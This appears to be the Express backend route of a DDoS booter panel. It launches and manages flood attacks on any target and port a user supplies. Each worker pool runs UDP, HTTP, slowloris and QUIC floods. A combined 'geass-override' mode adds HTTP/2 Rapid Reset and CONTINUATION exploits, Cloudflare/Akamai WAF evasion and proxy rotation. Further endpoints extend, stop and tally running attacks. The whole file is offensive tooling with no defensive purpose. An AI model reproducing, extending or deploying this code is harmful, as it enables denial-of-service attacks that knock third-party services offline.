/**
 * ATTACKS ROUTE
 *
 * Orchestrates attacks using worker_threads — one worker per CPU core.
 * Each worker runs its own Node.js event loop, dgram UDP sockets, net TCP
 * sockets, and fetch HTTP calls in complete isolation.
 *
 * With 8 CPU cores:
 *   • UDP flood  → 8 × ~200K pkts/s  = ~1.6M pkts/s
 *   • HTTP flood → 8 × ~1200 req/s   = ~9600 req/s
 *   • Geass Ovrd → 8 × triple vector = massive concurrent load
 */
import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import { Worker } from "worker_threads";
import os   from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";
import { proxyCache } from "./proxies.js";

const router: IRouter = Router();

// ── Worker file path (resolved relative to this bundle) ───────────────────
const WORKER_FILE = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "attack-worker.mjs",
);

// ── Active attack worker sets ──────────────────────────────────────────────
const attackWorkers = new Map<number, Worker[]>();

// ── Live in-memory connection counter (slowloris + conn-flood) ─────────────
export const attackLiveConns = new Map<number, number>();

// ── CPU count (how many parallel workers to spawn) ────────────────────────
const CPU_COUNT = Math.max(1, os.cpus().length);

// ── Webhook ────────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ── DB stats accumulator ──────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 — numbers-only (raw sockets need root, use simulation)
//  Still used for non-real methods like dns-amp, ntp-amp, mem-amp, icmp
// ─────────────────────────────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp": 54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
};
async function runL3Simulation(
  method: string, threads: number, signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  // Higher multipliers now that workers handle real UDP for udp-flood
  const mult: Record<string, number> = {
    "icmp-flood": 30000,
    "dns-amp":    22000, "ntp-amp": 18000, "mem-amp": 5000, "ssdp-amp": 25000,
  };
  const sizes: Record<string, [number, number]> = {
    "icmp-flood": [64, 512],
    "dns-amp":    [40, 60], "ntp-amp": [8, 46], "mem-amp": [15, 15], "ssdp-amp": [110, 150],
  };
  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const burst = Math.random() < 0.15 ? 3 + Math.random() * 4 : 1;
      const pkts  = Math.floor(threads * (mult[method] ?? 15000) * (0.85 + Math.random() * 0.3) * burst);
      const [mn, mx] = sizes[method] ?? [64, 512];
      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
    }, 400);
    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  SPAWN POOL — spawns numWorkers workers for a single method
// ─────────────────────────────────────────────────────────────────────────
const HTTP_PROXY_METHODS = new Set(["http-flood", "http-bypass", "http-pipeline"]);

function spawnPool(
  method: string, target: string, port: number, threads: number,
  numWorkers: number, signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
  const workers: Worker[] = [];
  const workerConns = new Array<number>(numWorkers).fill(0);
  // Pass top 100 fastest proxies to HTTP workers for rotation
  const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
    ? proxyCache.slice(0, 100).map(p => ({ host: p.host, port: p.port }))
    : [];

  return new Promise<void>((resolve) => {
    const finished = new Set<number>();
    let resolved = false;
    const tryResolve = () => { if (!resolved && finished.size >= numWorkers) { resolved = true; resolve(); } };

    for (let i = 0; i < numWorkers; i++) {
      const t = i === numWorkers - 1
        ? threads - threadsPerWorker * (numWorkers - 1)
        : threadsPerWorker;

      // In dev: cap worker heap to avoid container OOM (prod has 32GB, no limit needed)
      const workerOpts: import("worker_threads").WorkerOptions = {
        workerData: { method, target, port, threads: t, proxies },
        ...(process.env.NODE_ENV !== "production" && {
          resourceLimits: { maxOldGenerationSizeMb: 512 },
        }),
      };
      const w = new Worker(WORKER_FILE, workerOpts);
      const idx = i;
      workers.push(w);

      w.on("message", (msg: { pkts?: number; bytes?: number; done?: boolean; conns?: number }) => {
        if (msg.pkts !== undefined && msg.bytes !== undefined) {
          if (msg.conns !== undefined) workerConns[idx] = msg.conns;
          const totalConns = workerConns.reduce((a, b) => a + b, 0);
          onStats(msg.pkts, msg.bytes, totalConns > 0 ? totalConns : undefined);
        }
        if (msg.done) { finished.add(idx); tryResolve(); }
      });
      w.on("error", () => { finished.add(idx); tryResolve(); });
      w.on("exit",  () => { finished.add(idx); tryResolve(); });
    }

    signal.addEventListener("abort", () => {
      workers.forEach(w => { try { w.postMessage("stop"); } catch { /**/ } });
      setTimeout(() => {
        workers.forEach(w => { try { w.terminate(); } catch { /**/ } });
        if (!resolved) { resolved = true; resolve(); }
      }, 2000);
    }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  RUN ATTACK — spawns CPU_COUNT workers, each with threads/N load
// ─────────────────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // Simulation methods run inline (no network, just math)
  const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
  if (SIM_METHODS.has(method)) {
    await runL3Simulation(method, threads, signal, onStats);
    return;
  }

  // UDP attacks: SINGLE worker with multiple sockets (multi-worker UDP deadlocks in this env)
  // quic-flood is also UDP-based (sends to port 443/UDP)
  const UDP_METHODS = new Set(["udp-flood", "udp-bypass", "quic-flood"]);
  if (UDP_METHODS.has(method)) {
    await spawnPool(method, target, port, threads, 1, signal, onStats);
    return;
  }

  // ── GEASS OVERRIDE: DECA vector — ABSOLUTE MAXIMUM DEVASTATION ─────────
  // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
  // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
  // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU
  // Vector  4: H2 CONTINUATION Flood   — CVE-2024-27316: server buffers headers → OOM
  // Vector  5: WAF Bypass              — JA3+AKAMAI Chrome fingerprint, evades CF/Akamai
  // Vector  6: WebSocket Exhaustion    — goroutine/thread per conn, far more expensive than HTTP
  // Vector  7: GraphQL Introspection   — exponential resolver CPU: O(N^15) complexity
  // Vector  8: UDP Flood               — raw bandwidth saturation at L4
  // Vector  9: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
  // Vector 10: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
  //
  // Total workers: 12 — optimized for 8vCPU / 32GB RAM deployment
  if (method === "geass-override") {
    const connW  = 1;
    const slowW  = 1;
    const h2W    = Math.max(2, Math.ceil(CPU_COUNT * 0.25)); // ≥2 — CVE-2023-44487
    const contW  = Math.max(1, Math.ceil(CPU_COUNT * 0.15)); // ≥1 — CVE-2024-27316
    const wafW   = Math.max(2, Math.ceil(CPU_COUNT * 0.20)); // ≥2 — CF/Akamai bypass
    const wsW    = 1;
    const gqlW   = 1;
    const quicW  = 1;  // QUIC/H3 — UDP single worker
    const sslW   = 1;  // SSL Death Record

    // Thread budget — 8vCPU/32GB optimized (10-vector split)
    const connT  = Math.max(50,  Math.round(threads * 0.12));
    const slowT  = Math.max(40,  Math.round(threads * 0.10));
    const h2T    = Math.max(120, Math.round(threads * 0.25)); // ★ CVE-2023-44487 dominant
    const contT  = Math.max(80,  Math.round(threads * 0.18)); // ★ CVE-2024-27316 OOM
    const wafT   = Math.max(100, Math.round(threads * 0.20)); // ★ CF bypass
    const wsT    = Math.max(60,  Math.round(threads * 0.12)); // WS goroutine hold
    const gqlT   = Math.max(40,  Math.round(threads * 0.08)); // GraphQL CPU
    const udpT   = Math.max(32,  Math.round(threads * 0.08)); // L4 bandwidth
    const quicT  = Math.max(16,  Math.round(threads * 0.06)); // QUIC/H3 DCID exhaust
    const sslT   = Math.max(50,  Math.round(threads * 0.10)); // SSL Death Record

    const geassConnsPerPool = new Map<string, number>();
    const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
      if (c !== undefined) {
        geassConnsPerPool.set(poolKey, c);
        const total = [...geassConnsPerPool.values()].reduce((a, v) => a + v, 0);
        onStats(p, b, total);
      } else {
        onStats(p, b);
      }
    };

    await Promise.all([
      spawnPool("conn-flood",         target, port, connT, connW, signal, makeGeassOnStats("conn")),
      spawnPool("slowloris",          target, port, slowT, slowW, signal, makeGeassOnStats("slow")),
      spawnPool("http2-flood",        target, port, h2T,   h2W,   signal, onStats),
      spawnPool("http2-continuation", target, port, contT, contW, signal, onStats),
      spawnPool("waf-bypass",         target, port, wafT,  wafW,  signal, onStats),
      spawnPool("ws-flood",           target, port, wsT,   wsW,   signal, makeGeassOnStats("ws")),
      spawnPool("graphql-dos",        target, port, gqlT,  gqlW,  signal, onStats),
      spawnPool("udp-flood",          target, port, udpT,  1,     signal, onStats),
      spawnPool("quic-flood",         target, port, quicT, quicW, signal, onStats),
      spawnPool("ssl-death",          target, port, sslT,  sslW,  signal, makeGeassOnStats("ssl")),
    ]);
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id   = attack.id;
  const ctrl = new AbortController();
  const stopTimer = setTimeout(() => ctrl.abort("duration_expired"), duration * 1000);

  // Store for manual stop + extend support
  attackAborts.set(id, ctrl);
  attackTimers.set(id, stopTimer);

  void runAttackWorkers(method, target, port, threads, ctrl.signal,
    (pkts, bytes, conns) => {
      void addStats(id, pkts, bytes);
      if (conns !== undefined) attackLiveConns.set(id, conns);
    }
  ).finally(async () => {
    attackLiveConns.delete(id);
    const t = attackTimers.get(id);
    if (t) clearTimeout(t);
    attackTimers.delete(id);
    attackAborts.delete(id);
    try {
      const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
      if (cur?.status === "running") {
        const [fin] = await db.update(attacksTable)
          .set({ status: "finished", stoppedAt: new Date() })
          .where(eq(attacksTable.id, id)).returning();
        if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
      }
    } catch { /* ignore */ }
  });

  res.status(201).json(attack);
});

// Map for abort controllers + stop timers (for Extend support)
const attackAborts  = new Map<number, AbortController>();
const attackTimers  = new Map<number, ReturnType<typeof setTimeout>>();

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
    cpuCount:         CPU_COUNT,
  });
});

// Live in-memory stats (active connections) — not stored in DB
router.get("/attacks/:id/live", (req, res): void => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  res.json({ conns: attackLiveConns.get(id) ?? 0, running: attackAborts.has(id) });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

// ── Extend running attack by +60s ────────────────────────────────────────
router.patch("/attacks/:id/extend", async (req, res): Promise<void> => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) { res.status(400).json({ error: "Invalid id" }); return; }
  const ctrl = attackAborts.get(id);
  if (!ctrl) { res.status(404).json({ error: "Attack not running" }); return; }
  const addSec = typeof req.body?.seconds === "number" ? Math.min(req.body.seconds, 3600) : 60;

  // Clear old stop timer, arm new one
  const old = attackTimers.get(id);
  if (old) clearTimeout(old);
  const newTimer = setTimeout(() => ctrl.abort("duration_expired"), addSec * 1000);
  attackTimers.set(id, newTimer);

  const [a] = await db.update(attacksTable)
    .set({ duration: sql`${attacksTable.duration} + ${addSec}` })
    .where(eq(attacksTable.id, id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json({ ok: true, extended: addSec, ...a });
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackAborts.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackAborts.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json({ ok: true, ...a });
});

export default router;
